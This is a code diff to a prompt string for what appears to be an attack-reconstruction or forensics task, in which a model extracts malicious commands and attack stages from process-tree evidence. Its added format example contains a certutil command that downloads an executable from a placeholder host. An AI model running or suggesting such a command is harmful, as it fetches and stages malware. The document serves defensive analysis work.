@@ -33,6 +33,12 @@ TASK_PREAMBLE = (
     '{"malicious_events": [{"command": "<the exact command line from the evidence>", '
     '"stage": "<one stage name from the list above>"}, ...], '
     '"narrative": "<a short paragraph describing the attack you reconstructed>"}'
+    "\n\nIMPORTANT about the \"command\" field: copy ONLY the quoted command-line text for "
+    "that one event -- never the process name, PID, tree indentation, or any child lines "
+    "beneath it. For example, given this evidence line:\n"
+    '  certutil.exe (PID 3820): "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe"\n'
+    'the correct "command" value is exactly: certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe\n'
+    "-- not \"certutil.exe (PID 3820): ...\" and not the whole line including surrounding quotes."
 )
 
 
